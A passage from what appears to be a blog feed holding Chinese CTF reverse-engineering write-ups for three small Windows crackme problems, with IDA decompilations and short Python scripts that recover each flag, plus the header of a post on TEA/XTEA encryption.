class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x35</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x6F</span>, <span class="number">0x78</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x68</span>, <span class="number">0x30</span>, <span class="number">0x28</span>, <span class="number">0x2A</span>, <span class="number">0x59</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x59</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x39</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4A</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x79</span>, <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x3B</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x76</span>, <span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x49</span>, <span class="number">0x2A</span>, <span class="number">0x59</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x70</span>, <span class="number">0x32</span>, <span class="number">0x6F</span>, <span class="number">0x33</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x78</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x66</span>, <span class="number">0x79</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x2D</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0x6A</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x31</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x6B</span>, <span class="number">0x70</span>, <span class="number">0x49</span>, <span class="number">0x75</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x65</span>, <span class="number">0x2D</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x4C</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x58</span>, <span class="number">0x4A</span>, <span class="number">0x48</span>, <span class="number">0x43</span>, <span class="number">0x28</span>, <span class="number">0x49</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x75</span>, <span class="number">0x66</span>, <span class="number">0x2D</span>, <span class="number">0x30</span>, <span class="number">0x65</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0x33</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x6A</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0x70</span>, <span class="number">0x76</span>, <span class="number">0x69</span>, <span class="number">0x4A</span>, <span class="number">0x4F</span>, <span class="number">0x53</span>, <span class="number">0x44</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x70</span>, <span class="number">0x32</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x33</span>, <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x2D</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x31</span>, <span class="number">0x33</span>, <span class="number">0x6D</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x2D</span>, <span class="number">0x31</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0x5B</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x00</span>]</span><br><span class="line">v3 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">v3 += chr(table[<span class="number">47</span> * i % <span class="number">100</span>])</span><br><span class="line"><span class="keyword">print</span> v3</span><br></pre></td></tr></table></figure><h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file 6.exe</span><br><span class="line">6.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>在 IDA 里硬逆就完事了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> *v17; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+Ch] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v21; <span class="comment">// [esp+10h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> *v22; <span class="comment">// [esp+14h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v23; <span class="comment">// [esp+18h] [ebp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp+20h] [ebp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [esp+24h] [ebp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+28h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+2Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+30h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+34h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [esp+38h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+3Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [esp+40h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+44h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [esp+48h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [esp+4Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v37[<span class="number">3</span>]; <span class="comment">// [esp+50h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v39; <span class="comment">// [esp+68h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+6Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [esp+70h] [ebp-48h]</span></span><br><span class="line">  __int16 v42; <span class="comment">// [esp+74h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v43; <span class="comment">// [esp+78h] [ebp-40h]</span></span><br><span class="line">  __int16 v44; <span class="comment">// [esp+7Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [esp+7Eh] [ebp-3Ah]</span></span><br><span class="line">  <span class="keyword">int</span> v46; <span class="comment">// [esp+82h] [ebp-36h]</span></span><br><span class="line">  <span class="keyword">int</span> v47; <span class="comment">// [esp+86h] [ebp-32h]</span></span><br><span class="line">  __int16 v48; <span class="comment">// [esp+8Ah] [ebp-2Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v49; <span class="comment">// [esp+8Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// [esp+90h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v51; <span class="comment">// [esp+91h] [ebp-27h]</span></span><br><span class="line">  <span class="keyword">int</span> v52; <span class="comment">// [esp+95h] [ebp-23h]</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [esp+99h] [ebp-1Fh]</span></span><br><span class="line">  __int16 v54; <span class="comment">// [esp+9Dh] [ebp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v55; <span class="comment">// [esp+9Fh] [ebp-19h]</span></span><br><span class="line">  <span class="keyword">int</span> v56; <span class="comment">// [esp+A0h] [ebp-18h]</span></span><br><span class="line">  __int16 v57; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v58; <span class="comment">// [esp+A6h] [ebp-12h]</span></span><br><span class="line">  <span class="keyword">int</span> v59; <span class="comment">// [esp+AAh] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v60; <span class="comment">// [esp+AEh] [ebp-Ah]</span></span><br><span class="line">  __int16 v61; <span class="comment">// [esp+B2h] [ebp-6h]</span></span><br><span class="line"></span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">6451010</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v56 = <span class="number">1819435331</span>;</span><br><span class="line">  v40 = <span class="number">1231382892</span>;</span><br><span class="line">  v43 = <span class="number">2036624961</span>;</span><br><span class="line">  v39 = <span class="number">1866884462</span>;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v51 = <span class="number">0</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">0</span>;</span><br><span class="line">  v54 = <span class="number">0</span>;</span><br><span class="line">  v55 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">0</span>;</span><br><span class="line">  v59 = <span class="number">0</span>;</span><br><span class="line">  v60 = <span class="number">0</span>;</span><br><span class="line">  v61 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">2</span>;</span><br><span class="line">  v25 = <span class="number">5</span>;</span><br><span class="line">  v26 = <span class="number">9</span>;</span><br><span class="line">  v27 = <span class="number">6</span>;</span><br><span class="line">  v28 = <span class="number">7</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">10</span>;</span><br><span class="line">  v31 = <span class="number">8</span>;</span><br><span class="line">  v32 = <span class="number">12</span>;</span><br><span class="line">  v33 = <span class="number">11</span>;</span><br><span class="line">  v34 = <span class="number">3</span>;</span><br><span class="line">  v35 = <span class="number">4</span>;</span><br><span class="line">  v36 = <span class="number">1</span>;</span><br><span class="line">  v41 = <span class="number">1213493864</span>;</span><br><span class="line">  v42 = <span class="number">101</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _time64(<span class="number">0</span>);</span><br><span class="line">    srand(v23 + v3);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *(&amp;v36 + ++v4) = rand() % <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; <span class="number">3</span> );</span><br><span class="line">    v5 = <span class="number">3</span>;</span><br><span class="line">    v21 = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = &amp;v49;</span><br><span class="line">        v7 = <span class="number">28</span>;</span><br><span class="line">        v8 = <span class="number">-12</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = *(&amp;v36 + v6);</span><br><span class="line">          v20 = v37[v6];</span><br><span class="line">          <span class="keyword">if</span> ( v20 &gt; v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v22;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              v11 = *(_BYTE *)v10;</span><br><span class="line">              LOBYTE(v10[v8]) = *(_BYTE *)v10;</span><br><span class="line">              v10 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v10 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v11 );</span><br><span class="line">            v37[v6] = v9;</span><br><span class="line">            v12 = v22 - <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              v13 = *(_BYTE *)v12;</span><br><span class="line">              *((_BYTE *)v12 + <span class="number">20</span>) = *(_BYTE *)v12;</span><br><span class="line">              v12 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v13 );</span><br><span class="line">            *(&amp;v36 + v6) = v20;</span><br><span class="line">            v14 = &amp;v38;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              v15 = *v14;</span><br><span class="line">              v14[v7] = *v14;</span><br><span class="line">              ++v14;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v15 );</span><br><span class="line">            v5 = v21;</span><br><span class="line">          &#125;</span><br><span class="line">          v22 += <span class="number">5</span>;</span><br><span class="line">          ++v6;</span><br><span class="line">          v8 -= <span class="number">5</span>;</span><br><span class="line">          v7 += <span class="number">20</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v6 &lt; v5 );</span><br><span class="line">      &#125;</span><br><span class="line">      v21 = --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &gt; <span class="number">0</span> );</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v17 = &amp;v43;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s\t%d\n"</span>, v17, v37[v16++]);</span><br><span class="line">      v17 += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v16 &lt; <span class="number">3</span> );</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v43, <span class="string">"Andy"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v23;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v23 &lt; <span class="number">13</span> );</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v43, <span class="string">"Andy"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v23; ++i )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%c"</span>, *((<span class="keyword">char</span> *)&amp;v39 + *(&amp;v24 + i)));</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">k = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0xA</span>, <span class="number">8</span>, <span class="number">0xC</span>, <span class="number">0xB</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line">t = <span class="string">'oFen'</span>[::<span class="number">-1</span>] + <span class="string">'Ieil'</span>[::<span class="number">-1</span>] + <span class="string">'HTrh'</span>[::<span class="number">-1</span>] + <span class="string">'e'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">flag += t[k[i]]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file 7.exe</span><br><span class="line">7.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>简单地异或一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0xA</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">    v2[i] = a1[i] + <span class="number">2</span>;</span><br><span class="line">  v2[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = <span class="string">'asdfghjklq'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">flag += chr(ord(enc[i]) + <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在杭电的平台上做了几道题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Python实现TEA、XTEA、XXTEA加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/08/22/Python实现TEA、XTEA、XXTEA加密解密算法/</id>
    <published>2019-08-22T09:00:10.000Z</published>
    <updated>2019-09-03T09:37:58.100Z</updated>
    
